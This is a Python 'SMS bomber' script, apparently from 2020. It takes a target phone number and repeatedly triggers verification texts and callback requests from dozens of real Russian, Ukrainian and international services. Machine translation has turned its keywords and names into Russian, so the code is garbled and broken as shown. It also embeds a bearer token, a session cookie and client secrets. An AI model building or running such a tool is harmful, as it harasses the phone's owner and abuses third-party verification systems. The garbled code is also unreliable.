# Создатель: batiscuff
# Последний выпуск: 27.06.2020
 запросы на импорт , случайный , datetime , sys , время , argparse , os , json
из  колорамы  импортный  Fore , Back , Style


ос . система ( «очистить» )
colors = [ ' \ 033 [1; 31 м' , ' \ 033 [1; 32 м' , ' \ 033 [1; 33 м' , ' \ 033 [1; 34 м' , ' \ 033 [1; 35 м' , ' \ 033 [1; 36 м ' ]
W = ' \ 033 [0m'
c_color  =  random . выбор ( цвета )
хороший  = ( Fore . ЖЕЛТЫЙ + Стиль . BRIGHT + "[+]" +
    Стиль . RESET_ALL + Fore . ЗЕЛЕНЫЙ + Стиль . ЯРКО )
fail  = ( Fore . ЖЕЛТЫЙ + Стиль . BRIGHT + "[-]" +
    Стиль . RESET_ALL + Fore . КРАСНЫЙ + СТИЛЬ . ЯРКО )


ос . система ( «очистить» )
colors = [ ' \ 033 [1; 31 м' , ' \ 033 [1; 32 м' , ' \ 033 [1; 33 м' , ' \ 033 [1; 34 м' , ' \ 033 [1; 35 м' , ' \ 033 [1; 36 м ' ]
W = ' \ 033 [0m'
c_color  =  random . выбор ( цвета )
хороший  = ( Fore . ЖЕЛТЫЙ + Стиль . BRIGHT + "[+]" +
    Стиль . RESET_ALL + Fore . ЗЕЛЕНЫЙ + Стиль . ЯРКО )
fail  = ( Fore . ЖЕЛТЫЙ + Стиль . BRIGHT + "[-]" +
    Стиль . RESET_ALL + Fore . КРАСНЫЙ + СТИЛЬ . ЯРКО )


def  banner ():
    ос . система ( «очистить» )
    logo  =  "" "
 █▀▄ █░█ █▀▄ █░░ ▄▀▄ ▄▀▀ █▀▄ ▄▀▄ █▄░▄█
 █░█ █░█ █░█ █░▄ █░█ ░▀▄ █░█ █▀█ █░█░█
 ▀▀░ ░▀░ █▀░ ▀▀▀ ░▀░ ▀▀░ █▀░ ▀░▀ ▀░░░▀
    «»»
    clrs  =  печать ( c_color + логотип + W )

def  check_number ():
    глобальный  телефон
    попробуй :
        если  int ( телефон ) и  len ( телефон ) <=  13 : # +380961114455
            если  телефон [ 0 ] ==  '+' :
                телефон  =  телефон [ 1 :]
            если  телефон [ 0 ] ==  '0' :
                телефон  =  '38'  +  телефон
            если  телефон [ 0 ] ==  '3' :
                телефон  =  телефон
        еще :
            печать ( Fore . КРАСНЫЙ + Стиль . BRIGHT + "Номер введён неоно!" + Стиль . RESET_ALL )
            выход ()
    кроме  ValueError :
        печать ( Fore . КРАСНЫЙ + Стиль . BRIGHT + "Номер введён неоно!" + Стиль . RESET_ALL )
        выход ()


def  generate_info ():
    глобальный  _name
    глобальная  почта
    глобальный  пароль
    глобальное  имя пользователя
    _russian  =  '' . join ([ random . choice ( 'йцукенгшщзхъфывапролджэячмитьбюЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ' ) для  x  в  диапазоне ( 8 )])
    _name  =  '' . присоединиться ([ случайный . выбор ( '1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ' ) для  й  в  диапазоне ( 8 )])
    пароль  =  '' . присоединиться ([ случайный . выбор ( '1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ' ) для  й  в  диапазоне ( 11 )])
    имя пользователя  =  '' . присоединиться ([ случайный . выбор ( '1234567890abcdefghigklmnopqrstuvyxwz' ) для  й  в  диапазоне ( 8 )])
    _email  =  '' . присоединиться ([ случайный . выбор ( '1234567890abcdefghigklmnopqrstuvyxwz' ) для  й  в  диапазоне ( 8 )]) + '@ gmail.com'


def  start ():
    print ( Fore . СИНИЙ + Стиль . BRIGHT + f ' \ n Номер: { phone } \ n Циклы: { count } ' + ' \ n Спамер запущен. \ n Если вы хотите остановить - нажмите Ctrl + Z.' + Стиль . RESET_ALL )
    глобальная  итерация
    итерация  =  0
    время  итерации  <  count :
        попробуй :
            фризор = {
                'Content-type' : 'application / json' ,
                «Принять» : «приложение / JSON, текст / обычный» ,
                «авторизация» : «Носитель yusw3yeu6hrr4r9j3gw6» ,
                'user-agent' : 'Mozilla / 5.0 (X11; Linux x86_64) AppleWebKit / 537.36 (KHTML, как Gecko) snap Chromium / 81.0.4044.138 Chrome / 81.0.4044.138 Safari / 537.36' ,
                'cookie' : 'auth = vov0ptt2rlhni0ten4n9kh5q078l0dm5elp904lq6ncsfmac0md8i8bcmqilk8u3; Ланг = 1; yc_vid = 97527048909; yc_firstvisit = 1589271208; _ym_uid = 1589271210161580972; _ym_d = 1589271210; _ga = GA1.2.2045789867.1589271211; _gid = GA1.2.807235883.1589271211; _ym_visorc_35239280 = Ь; _ym_isad = 2; _gat_gtag_UA_68406331_1 = 1'
                }
            запросы . post ( "https://n13423.yclients.com/api/v1/book_code/312054" , data = json . dumps ({ "phone" : phone }), заголовки = frisor )
            # 1 раз в минуту
            печать ( приятно + "Фризор отправлено!" + Стиль . RESET_ALL )
        кроме :
            print ( ошибка + "Frizor не отправлен" + Style . RESET_ALL )
        попробуй :
            запросы . post ( "https://kasta.ua/api/v2/login/" , data = { 'phone' : phone })
            печатать ( приятно + "Kasta отправлено!" + Стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "Kasta не отправлен" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( "https://izi.ua/api/auth/register" , json = { "phone" : '+' + phone , "name" : _russian , "is_terms_accepted" : "true" })
            печатать ( приятно + "IZI отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "IZI не отправлен" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( "https://junker.kiev.ua/postmaster.php" , data = {
            'tel' : phone [ 2 :], 'name' : _name , 'action' : 'callme' ,
            })
            печать ( приятно + "Юнкер Киев отправлено!" + Стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "Юнкер Киев не отправлен" + Стиль . RESET_ALL )
        попробуй :
            запросы . post ( "https://youla.ru/web-api/auth/request_code" , data = { 'phone' : phone })
            печатать ( приятно + "Youla отправлено!" + Стиль . RESET_ALL )
        кроме :
            print ( ошибка + "Youla не отправлен" + Style . RESET_ALL )
        попробуй :
            запросы . post ( 'https://cloud.mail.ru/api/v2/notify/applink' , json = { "phone" : "+"  +  phone , "api" : 2 , "email" : "email" , " x-email " : " x-email " })
            печатать ( приятно + "MailRu Cloud отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "MailRu Cloud не отправлен" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( 'https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru' , data = { 'phone' : phone })
            запросы . сообщение ( f "https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone= { '+' + phone } " )
            печатать ( приятно + "BELTELECOM3 отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "BELTELECOM3 не отправлен" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' , data = { 'phone_number' : phone }, заголовки = {})
            печатать ( приятно + "трут отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "трут не отправлен" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( "https://crm.getmancar.com.ua/api/veryfyaccount" , json = { "phone" : '+' + phone , "grant_type" : "password" , "client_id" : "gcarAppMob" , " client_secret " : " SomeRandomCharsAndNumbersMobile " ,})
            печатать ( приятно + "Getmancar отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "Getmancar не отправлен" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( "https://www.icq.com/smsreg/requestPhoneValidation.php" , data = { "msisdn" : телефон , "locale" : "en" , "countryCode" : "ru" , "version" : " 1 " , " k " : " ic1rtwz1s1Hj1O0r " , " r " : " 46763 " })
            печатать ( приятно + "ICQ отправлено!" + Стиль . RESET_ALL )
        кроме :
            print ( ошибка + "ICQ не отправлен" + Style . RESET_ALL )
        попробуй :
            запросы . post ( "https://api.pozichka.ua/v1/registration/send" , json = { "RegisterSendForm" : { "phone" : '+' + phone }})
            печатать ( приятно + "Позичка отправлено!" + Стиль . RESET_ALL )
        кроме :
            print ( ошибка + "Pozichka не отправлен" + Style . RESET_ALL )
        попробуй :
            запросы . post ( f'https: //secure.online.ua/ajax/check_phone/? reg_phone = { phone } ' )
            печать ( приятно + "SecureOnline отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "SecureOnline не отправлен" + стиль . RESET_ALL )
        попробуй :
            запросы . сообщение ( 'https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+ {}' . формат ( телефон ))
            печать ( приятно + "SportMaster отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "SportMaster не отправлен" + стиль . RESET_ALL )
        попробуй :
            запросы . get ( "https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper" , params = { "oper" : 9 , "callmode" : 1 , "phone" : '+' + phone })
            печатать ( приятно + "Звонок отправлено!" + Стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "Звонок не отправлен" + Стиль . RESET_ALL )
        попробуй :
            запросы . post ( "https://city24.ua/personalaccount/account/registration" , data = { "PhoneNumber" : phone },)
            печатать ( приятно + "City24 отправлено!" + Стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "City24 не отправлено" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( "https://helsi.me/api/healthy/accounts/login" , json = { "phone" : phone , "platform" : "PISWeb" },)
            печатать ( приятно + "Helsi отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "Helsi не отправлено" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( "https://cloud.mail.ru/api/v2/notify/applink" , json = { "phone" : "+"  +  phone , "api" : 2 , "email" : _email })
            печатать ( приятно + "CloudMail отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "CloudMail не отправлено" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( "https://auth.multiplex.ua/login" , json = { "login" : phone },)
            печатать ( приятно + "мультиплекс отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "мультиплекс не отправлено" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( "https://account.my.games/signup_send_sms/" , data = { "phone" : phone },)
            печатать ( приятно + "MyGames отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "MyGames не отправлено" + стиль . RESET_ALL )
        попробуй :
            запросы . get ( "https://cabinet.planetakino.ua/service/sms" , params = { "phone" : phone })
            печатать ( приятно + "Planetakino отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "Планетакино не отправлено" + Стиль . RESET_ALL )
        попробуй :
            запросы . post ( 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' , data = { 'phone_number' : phone })
            печатать ( приятно + "трут отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "трут не отправлено" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( 'https://youla.ru/web-api/auth/request_code' , data = { 'phone' : phone })
            печатать ( приятно + "Youla отправлено!" + Стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "Youla не отправлено" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( 'https://rutube.ru/api/accounts/sendpass/phone' , data = { 'phone' : '+' + phone })
            печать ( приятно + "LiST отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "LiST не отправлено" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( 'https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode' , params = { "pageName" : "registerPrivateUserPhoneVerificatio" }, data = { "phone" : phone , "recaptcha" : 'off' , "g-recaptcha-response" : "" })
            печатать ( приятно + "MVideo отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "MVideo не отправлено" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' , data = { 'phone_number' : phone })
            печатать ( приятно + "трут отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "трут не отправлено" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( 'https://passport.twitch.tv/register?trusted_request=true' , json = { "день рождения" : { "день" : 11 , "месяц" : 11 , "год" : 1999 }, "client_id") : "kd1unb4b3q4t58fwlpcbzcbnm76a8fp" , "include_verification_code" : True , "пароль" : пароль , "phone_number" : телефон , "имя пользователя" :
            печать ( приятно + "Twitch отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "Twitch не отправлено" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( 'https://lk.belkacar.ru/register' , data = { 'phone' : '+' + phone })
            печать ( приятно + "BelkaCar отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "BelkaCar не отправлено" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( "https://api.ivi.ru/mobileapi/user/register/phone/v6" , data = { "phone" : phone })
            печатать ( приятно + "IVI отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "IVI не отправлено" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( "https://www.sportmaster.ua/" , params = { "module" : "users" , "action" : "SendSMSReg" , "phone" : phone })
            запросы . post ( 'https://lk.belkacar.ru/get-confirmation-code' , data = { 'phone' : '+' + phone })
            печать ( приятно + "SportMaster, BelkaCar отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "SportMaster не отправлено" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( "https://secure.online.ua/ajax/check_phone/" , params = { "reg_phone" : phone })
            печать ( приятно + "SecureOnline отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "SecureOnline не отправлено" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( "https://www.nl.ua" , data = { "component" : "bxmaker.authuserphone.login" , "sessid" : "bf70db951f54b837748f69b75a61deb4" , "method" : "sendCode" , "phone" : phone) , "регистрация" : "N" })
            печатать ( приятно + "НоваЛиния отправлено!" + Стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "НоваяЛиния не отправлено" + Стиль . RESET_ALL )
        попробуй :
            запросы . post ( "https://mobileplanet.ua/register" , data = { "klient_name" : _name , "klient_phone" : "+"  +  phone , "klient_email" : _email })
            печать ( приятно + "MPlanet отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "MPlanet не отправлено" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( "https://api.delitime.ru/api/v2/signup" , data = { "RegistrationForm [имя пользователя]" : телефон , "RegistrationForm [тип_устройства]" : 3 })
            печатать ( приятно + "DELIMOBIL отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "DELIMOBIL не отправлено" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( 'https://apteka366.ru/login/register/sms/send' , data = { "phone" : phone })
            печатать ( приятно + "Аптека 366 отправлено!" + Стиль . RESET_ALL )
        кроме :
            печать ( «Аптека 366 не отправлено» )
        попробуй :
            запросы . post ( 'https://belkacar.ru/get-confirmation-code' , data = { "phone" : phone })
            печать ( приятно + "Belkacar отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "Belkacar не отправлено" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( 'https://drugvokrug.ru/siteActions/processSms.html' , data = { "cell" : phone })
            печатать ( приятно + "Друг Вокруг отправлено!" + Стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "Друг Вокруг не отправлено" + Стиль . RESET_ALL )
        попробуй :
            запросы . post ( 'https://api.ennergiia.com/auth/api/development/lor' , json = { "referrer" : "ennergiia" , "phone" : '+' + phone })
            печать ( красиво + "Энергия отправлено!" + Стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "Энергия не отправлено" + Стиль . RESET_ALL )
        попробуй :
            запросы . get ( 'https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber= {}' . format ( '+' + phone ))
            печатать ( приятно + "Fundayshop отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "Fundayshop не отправлено" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( 'https://gorzdrav.org/login/register/sms/send' , data = { "phone" : phone })
            печать ( приятно + "Горздрав отправлено!" + Стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "Горздрав не отправлено" + Стиль . RESET_ALL )
        попробуй :
            запросы . post ( 'https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms' , data = { "phone" : '+' + phone })
            печатать ( приятно + "KFC отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "KFC не отправлено" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( 'https://api-production.viasat.ru/api/v1/auth_codes' , json = { "msisdn" : '+' + phone })
            печатать ( приятно + "Viasat отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "Viasat не отправлено" + стиль . RESET_ALL )
        попробуй :
            запросы . post ( 'https://eda.yandex/api/v1/user/request_authentication_code' , json = { "phone_number" : phone })
            печатать ( приятно + "Яндекс Еда отправлено!" + Стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "Яндекс-еда не отправлено" + Стиль . RESET_ALL )
        попробуй :
            запросы . сообщение ( f'https: //www.citilink.ru/registration/confirm/phone/+ { phone } / ' )
            печатать ( приятно + "Ситилинк отправлено!" + Стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "Ситилинк не отправлено" + Стиль . RESET_ALL )
        попробуй :
            запросы . post ( 'https://eda.yandex/api/v1/user/request_authentication_code' , json = { 'phone_number' : '+'  +  phone })
            печатать ( приятно + "яндекс эда отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "Яндекс Эда не отправлено" + Стиль . RESET_ALL )
        попробуй :
            запросы . post ( "https://my.dianet.com.ua/send_sms/" , data = { "phone" : phone })
            печатать ( приятно + "Dianet отправлено!" + стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "Dianet не отправлено" + стиль . RESET_ALL )
        попробуй :
            запросы . get ( "https://api.eldorado.ua/v1/sign/" , params = { "login" : phone , "step" : "phone-check" , "fb_id" : "null" , "fb_token" : "null" , "lang" : "ru" ,})
            печатать ( приятно + "Эльдорадо отправлено!" + Стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "Эльдорадо не отправлено" + Стиль . RESET_ALL )
        попробуй :
            запросы . post ( "https://shafa.ua/api/v3/graphiql" , json = {
                "operationName" : "RegistrationSendSms" ,
                "variable" : { "phoneNumber" : "+"  +  phone },
                "query" : "mutation RegistrationSendSms ($ phoneNumber: String!) { \ n   unauthorizedSendSms (phoneNumber: $ phoneNumber) { \ n     isSuccess \ n     userToken \ n     error { \ n       field \ n       messages { \ n         message \ n         code \ n         __typename \ n       } \ n       __typename \ n     } \ n     __typename \ n   } \ n } \ n " ,
            },)
            печать ( приятно + "Шафа отправлено!" + Стиль . RESET_ALL )
        кроме :
            печать ( ошибка + "Shafa не отправлено" + стиль . RESET_ALL )
        итерация  + =  1
        print ( Fore . CYAN + Стиль . BRIGHT + ( f ' \ n { итерация } круг пройден. \ n ' ) + Стиль . RESET_ALL )
    ос . система ( «очистить» )


 меню def ():
    печать ( Fore . CYAN + Стиль . BRIGHT + "Введите номер:" + Стиль . RESET_ALL )
    глобальный  телефон
    phone  =  input ( c_color + "f.school >>" + W )
    check_number ()
    печать ( Fore . CYAN + Style . BRIGHT + "Введите количество циклов:" + Style . RESET_ALL )
    глобальный  счет
    count  =  input ( c_color + "f.school >>" + W )
    count  =  int ( count )
    ос . система ( «очистить» )
    generate_info ()
    баннер ()
    начало ()
    баннер ()
    печать ( Fore . ЖЕЛТЫЙ + Стиль . BRIGHT + f " \ n Готово. \ n Телефон: { phone } \ n Кол-во пройденных циклов: { итерация } " + Стиль . RESET_ALL )


def  main ():
    баннер ()
    меню ()

основной ()
